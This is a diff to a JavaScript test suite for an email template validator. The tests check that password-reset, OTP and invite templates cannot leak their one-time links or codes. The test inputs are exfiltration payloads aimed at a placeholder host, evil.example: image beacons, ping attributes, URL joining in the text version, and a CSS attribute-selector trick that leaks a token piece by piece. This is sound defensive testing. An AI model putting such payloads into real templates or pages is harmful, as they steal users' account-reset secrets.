@@ -246,12 +246,12 @@ test('a link placeholder cannot hand its one-time secret to another site', () =>
   hasError(validateTemplate('password_reset', withHtml('<p><img src="https://evil.example/p.gif?u={{url}}" alt=""></p>'), layout), 'html', /only go in href/);
   hasError(validateTemplate('password_reset', withHtml('<p><img src="{{url}}" alt=""></p>'), layout), 'html', /only go in href, not in src/);
   hasError(validateTemplate('password_reset', withHtml('<p><a href="https://evil/?u={{url}}">x</a></p>'), layout), 'html', /whole href value/);
-  hasError(validateTemplate('password_reset', withHtml('<p><a href="{{url}}" ping="https://evil/?c={{url}}">x</a></p>'), layout), 'html', /not in ping/);
+  hasError(validateTemplate('password_reset', withHtml('<p><a href="{{url}}" ping="https://evil/?c={{url}}">x</a></p>'), layout), 'html', /ping attribute/);
   for (const attr of ['srcset', 'background', 'poster']) {
     hasError(validateTemplate('password_reset', withHtml(`<p><a href="{{url}}" ${attr}="{{url}}">x</a></p>`), layout), 'html', new RegExp(`not in ${attr}`));
   }
   const otp = englishTemplate('otp');
-  hasError(validateTemplate('otp', { ...otp, html: `${otp.html}<p><a href="https://x.example/" ping="https://evil/?c={{code}}">x</a></p>` }, layout), 'html', /Only a link placeholder can go in ping/);
+  hasError(validateTemplate('otp', { ...otp, html: `${otp.html}<p><a href="https://x.example/" ping="https://evil/?c={{code}}">x</a></p>` }, layout), 'html', /ping attribute/);
   // The whole value, space around it allowed.
   assert.deepEqual(validateTemplate('password_reset', withHtml('<p><a href=" {{url}} ">again</a></p>'), layout), { ok: true });
 });
@@ -260,16 +260,58 @@ test('in the text version a link placeholder cannot be joined into a longer addr
   const reset = englishTemplate('password_reset');
   const layout = SEEDS.layouts[0];
   const withText = (extra) => ({ ...reset, text: `${reset.text}${extra}` });
-  const joined = /cannot come right after a letter, digit or URL character/;
-  for (const bad of ['\nhttps://evil.example/?u={{url}}', '\n?u={{url}}', '\nx{{url}}', '\n{{#if url}}?u={{/if}}{{url}}']) {
-    hasError(validateTemplate('password_reset', withText(bad), layout), 'text', joined);
-  }
-  // Text mail fetches nothing, so any character before it that cannot continue
-  // a URL is fine, as Japanese, Chinese and Korean translations write it; what
-  // follows can only extend our own link.
-  for (const ok of ['\n\u3053\u3061\u3089{{url}}', '\n\u8be6\u60c5\uff1a{{url}}', '\nAgain: {{url}}', '\n({{url}})', '\nOpen it: {{url}}.', '\n{{url}}x']) {
+  const joined = /only a space, a line break or "\(" may come right before it/;
+  // The reviewer's probes: any ASCII sign, another letter, an invisible or
+  // no-break space, an empty condition, or another value right before it.
+  const before = ['https://evil.example/?u=', '?u=', 'x', 'https://evil.example/x!', 'https://evil.example/x,', 'https://evil.example/x;',
+    'https://evil.example/x*', 'https://evil.example/x$', "https://evil.example/x'", 'https://evil.example/?u=(', 'https://evil.example/?u=\u00e9',
+    'https://evil.example/?u=\u00a0', 'https://evil.example/?u=\u200b', 'https://evil.example/?u=&#61;', 'https://evil.example/?u={{#if url}}{{/if}}', 'Reset {{url}}'];
+  for (const lead of before) hasError(validateTemplate('password_reset', withText(`\n${lead}{{url}}`), layout), 'text', joined);
+  // Text mail fetches nothing, so what follows can only extend our own link;
+  // a space, a "(" after one, punctuation outside ASCII or a CJK letter before
+  // it are fine, as Japanese, Chinese and Korean translations write it.
+  for (const ok of ['\n\u3053\u3061\u3089{{url}}', '\n\u8be6\u60c5\uff1a{{url}}', '\n\uc5ec\uae30{{url}}', '\nAgain: {{url}}', '\n({{url}})', '\nOpen it: {{url}}.', '\n{{url}}x']) {
     assert.deepEqual(validateTemplate('password_reset', withText(ok), layout), { ok: true }, ok);
   }
   const invite = englishTemplate('project_invite');
   hasError(validateTemplate('project_invite', { ...invite, text: `${invite.text}\n{{inviter}}{{url}}` }, layout), 'text', joined);
+  // The whole mail is checked, the layout's text around the template's.
+  const splice = { html: layout.html, text: 'https://evil.example/?u={{content}}' };
+  hasError(validateTemplate('password_reset', { ...reset, text: '{{url}} to reset' }, splice), 'text', joined);
+});
+
+test('a layout\'s text leads each part as a link may be led', () => {
+  const layout = SEEDS.layouts[0];
+  for (const text of ['https://evil.example/?u={{content}}', 'https://evil.example/?u={{why}}\n{{content}}', '{{content}}\nx{{preheader}}']) {
+    hasError(validateLayout({ html: layout.html, text }, []), 'text', /only a space, a line break or "\(" may come right before/);
+  }
+  assert.deepEqual(validateLayout({ html: layout.html, text: 'Homeroom\n\n{{content}}\n\n{{why}}' }, []), { ok: true });
+});
+
+test('in HTML a link placeholder is a whole href, or the whole text of that link', () => {
+  const reset = englishTemplate('password_reset');
+  const layout = SEEDS.layouts[0];
+  const base = { ...reset, html: '<p><a href="{{url}}">Reset</a></p>' };
+  const inHtml = /can only be a whole href value/;
+  hasError(validateTemplate('password_reset', { ...base, html: '<p><a href="{{url}}">R</a> https://evil.example/?u={{url}}</p>' }, layout), 'html', inHtml);
+  hasError(validateTemplate('password_reset', { ...base, why: 'See https://evil.example/?u={{url}}' }, layout), 'why', inHtml);
+  hasError(validateTemplate('password_reset', { ...base, preheader: 'https://evil.example/?u={{url}}' }, layout), 'preheader', inHtml);
+  hasError(validateTemplate('password_reset', { ...base, html: '<p><a href="{{url}}">Go: {{url}}</a></p>' }, layout), 'html', inHtml);
+  hasError(validateTemplate('password_reset', { ...base, html: '<p><a href="https://x.example/">{{url}}</a><a href="{{url}}">R</a></p>' }, layout), 'html', inHtml);
+  hasError(validateTemplate('password_reset', { ...base, html: '<p><a href="{{url}}" ping="https://evil.example/p">R</a></p>' }, layout), 'html', /ping/);
+  assert.deepEqual(validateTemplate('password_reset', { ...base, html: '<p><a href="{{url}}" style="color:#0a6ee0"> {{url}} </a></p>' }, layout), { ok: true });
+});
+
+test('probe: a <style> block cannot spell a link out with attribute selectors', () => {
+  const hex = '0123456789abcdef';
+  let css = '';
+  let anchors = '';
+  let i = 0;
+  for (const a of hex) for (const b of hex) {
+    css += `#k${i}[href*="${a}${b}"]{background:url(https://evil.example/b/${a}${b})}`;
+    anchors += `<a id="k${i}" href="{{url}}"></a>`;
+    i++;
+  }
+  const html = `<style>${css}</style><p><a href="{{url}}">Reset</a></p>${anchors}`;
+  hasError(validateTemplate('password_reset', { subject: 'Reset', preheader: '', why: '', html, text: 'Reset: {{url}}' }, SEEDS.layouts[0]), 'html', /attribute selector/);
 });
